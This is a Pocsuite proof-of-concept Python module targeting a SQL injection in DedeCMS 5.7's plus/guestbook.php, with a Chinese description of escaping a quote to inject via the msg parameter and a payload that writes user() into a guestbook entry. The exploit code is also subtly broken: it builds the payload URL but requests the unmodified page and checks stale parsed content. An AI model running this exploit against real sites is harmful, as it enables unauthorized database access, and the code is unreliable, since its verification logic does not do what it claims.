#!/usr/bin/env python
#!coding: utf-8
import re
import sys
from bs4 import BeautifulSoup

from pocsuite.net import req
from pocsuite.poc import POCBase,Output
from pocsuite.utils import register

class Fuckdede(POCBase):
	vulID='2'
	version = '1'
	author = ['fengxuan']
	vulDate = '2016-2-13'
	createDate = '2016-2-13'
	updateDate = '2016-2-13'
	references = ['http://www.evalshell.com', 'http://www.moonsec.com/post-13.html']
	name = 'dedecms plus/guestbook.php 注入漏洞利用EXP'
	appPowerLink = 'http://www.dedecms.cn/'
	appName = 'dedecms'
	appVersion = '5.7'
	vulType = 'SQL Injection'
	desc = '''
           开发人员在修补漏洞的时候只修复了少数的变量而遗漏了其他变量，使其他变量直接
           带入了SQL语句中，可以通过\字符来转义掉一个单引号，逃逸单引号，产生SQL注入。
           此注入为报错注入，可以通过UpdateXML函数进行注入。
    '''
	samples = ['']

	def _verify(self):
		result = {}
		target = self.url + "/plus/guestbook.php"
		response = req.get(target)
		content = response.content
		soup = BeautifulSoup(content, 'lxml')
		msgid = None
		for line in soup.findAll('a'):
			if line.get('href').startswith('guestbook.php?action=admin'):
				msgid = line.get('href')[30:]
				break
		if msgid == None:
                        print ("No msgid find.")
		payload = self.url + "/plus/guestbook.php?action=admin&job=editok&id={0}&msg=',msg=user(),email='".format(msgid)
		req.get(target)
		target = self.url + "/plus/guestbook.php"
		response = req.get(target)
		content = response.content
		for line in soup.findAll('td', attrs={'class':'msgtd'}):
			if line.text.find('@localhost') >= 0:
				result = {'VerifyInfo':{}}
				result['VerifyInfo']['URL'] = self.url
				return self.parse_result(result)

	def _attack(self):
		return self._verify()

	def parse_result(self, result):
		output = Output(self)

		if result:
			output.success(result)
		else:
			output.fail("Internet Nothing returned")
		return output

register(Fuckdede)




